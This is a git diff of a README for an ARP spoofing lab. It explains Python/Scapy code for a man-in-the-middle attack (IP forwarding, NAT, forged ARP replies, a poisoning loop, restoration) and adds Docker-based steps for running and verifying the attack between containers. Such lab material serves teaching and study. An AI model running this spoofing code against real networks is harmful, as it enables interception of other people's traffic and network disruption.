@@ -37,8 +37,7 @@ def enable_ip_forwarding():
     # 2. Configure NAT (Masquerade)
     os.system(f"iptables -t nat -A POSTROUTING -o {INTERFACE} -j MASQUERADE")
     os.system(f"iptables -A FORWARD -i {INTERFACE} -j ACCEPT")
-
-```python 
+```
 
 echo 1:
 Enables Linux packet forwarding. Even if the packet is not destined for the attacker, the OS forwards it instead of dropping it.
@@ -48,27 +47,29 @@ Performs Network Address Translation. When the attacker forwards packets to the 
 
 Why this matters:
 Ensures the router sends return traffic back to the attacker, not directly to the victim. Without NAT, the victim might bypass the MITM.
-2. Get MAC Address
+
+### 2. Get MAC Address
 We need the hardware addresses (MAC) to construct valid Ethernet frames.
 
-```python 
+```python
+
 def get_mac(ip):
     """ Sends an ARP request to get the MAC address of an IP """
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False, iface=INTERFACE)
     if ans:
         return ans[0][1].hwsrc
     return None
-```python 
+```
 
 
 This part sends a broadcast ARP request ("Who has this IP?") to the entire network (ff:ff:ff:ff:ff:ff).
 
 It waits for a reply to find the MAC address mapped to the Victim's IP and the Gateway's IP.
 
-3. The Spoof (The "Lie")
+### 3. The Spoof 
 This is the core of the attack where we corrupt the ARP cache.
 
-Python
+
 
 ```python 
 def spoof(target_ip, spoof_ip, target_mac):
@@ -76,7 +77,7 @@ def spoof(target_ip, spoof_ip, target_mac):
     # op=2 is ARP Reply.
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     send(packet, verbose=False, iface=INTERFACE)
-```python 
+```
 
 op=2 (ARP Reply): We use Opcode 2 to forcefully update the ARP table on the target machine, even though they never sent a request.
 
@@ -84,7 +85,8 @@ The Trick: We tell the Target (Victim) that the Spoof IP (Gateway) is located at
 
 Scapy's Role: We do not specify hwsrc (Source MAC). Scapy automatically fills this with the attacker's MAC address, which completes the deception.
 
-4. Running the Attack (The Loop)
+
+### 4. Running the Attack 
 ARP entries expire after a short time. We must keep lying to maintain the connection.
 
 ```python 
@@ -98,7 +100,7 @@ try:
         spoof(WEBSITE_IP, VICTIM_IP, website_mac)
         
         time.sleep(2)
-```python 
+```
 
 Continuous Spoofing: We enter a while True loop to continuously send packets.
 
@@ -106,7 +108,8 @@ Two-Way Deception: We must poison both the Victim and the Gateway to intercept f
 
 time.sleep(2): We send these packets every 2 seconds to ensure the ARP cache stays poisoned and doesn't revert to the real MAC address.
 
-5. Restore (Cleanup)
+
+### 5. Restore (Cleanup)
 When we stop the attack (Ctrl+C), we must be polite and fix the network.
 
 ```python 
@@ -115,20 +118,69 @@ def restore(dest_ip, source_ip, dest_mac, source_mac):
     packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
     send(packet, count=4, verbose=False, iface=INTERFACE)
     
-```python 
+```
 If we simply exit, the victim will have the wrong MAC address cached and will lose internet access (DoS).
 
 This function sends the correct MAC address (hwsrc=source_mac) to the victim and router.
 
 We send it 4 times to ensure the packet is received and the tables are updated.
 
-How to Run
-Configure Interface: Check your network interface name (e.g., eth0, wlan0) and update the INTERFACE variable in the script.
+##  How to test it
 
-Set IPs: Update VICTIM_IP and WEBSITE_IP (Gateway IP).
+Follow these steps to set up the environment, launch the ARP Spoofing attack, and verify the results.
 
-Execute: Run the script with root privileges:
+### 1. Setup & Start Environment
+Run the following command to build the Docker image and start the Attacker and Victim containers in the background.
 
-Bash
+```bash
+docker-compose up -d --build
+```
 
-sudo python3 arp_spoof.py
+### 2. Launch the Attack
+Open a terminal inside the **Attacker** container and run the python script.
+
+```bash
+# 1. Enter the attacker container
+docker exec -it attacker bash
+
+# 2. Run the ARP Poisoning script
+# Usage: python main.py [command] [target_ip] [gateway_ip] [interface]
+python main.py arp_pois 172.25.0.10 172.25.0.1 eth0
+```
+> **Note:** The script will run continuously. Keep this terminal open to maintain the attack.
+
+### 3. Verify the Attack (Proof of Concept)
+Open a **new terminal window** to check if the attack is working as intended.
+
+#### A. Check ARP Spoofing (Identity Theft)
+Check the **Victim's** ARP table to see if they have been fooled.
+
+```bash
+# Check Victim's ARP table
+docker exec victim arp -a
+```
+**Success Criteria:**
+1.  Look at the entry for the Gateway (`172.25.0.1`).
+2.  Compare it to the Attacker's real MAC address (you can find it by running `docker exec attacker cat /sys/class/net/eth0/address`).
+3.  If the **Gateway's MAC address** in the victim's table matches the **Attacker's MAC address**, the spoofing is successful.
+
+#### B. Check Packet Delivery (Man-in-the-Middle)
+Ensure that IP forwarding is enabled and the victim's traffic is being routed through the attacker correctly (not blocked).
+
+```bash
+# Ping Google DNS from the Victim container
+docker exec victim ping -c 4 8.8.8.8
+```
+**Success Criteria:**
+* You should see `64 bytes from 8.8.8.8...` (Successful replies).
+* If you see "Request Timeout", IP forwarding is not working.
+
+### 4. Cleanup
+To stop the attack and remove all containers and networks:
+
+1.  Press `Ctrl + C` in the Attacker terminal to stop the Python script.
+2.  Run the following command in your main terminal:
+
+```bash
+docker-compose down
+```
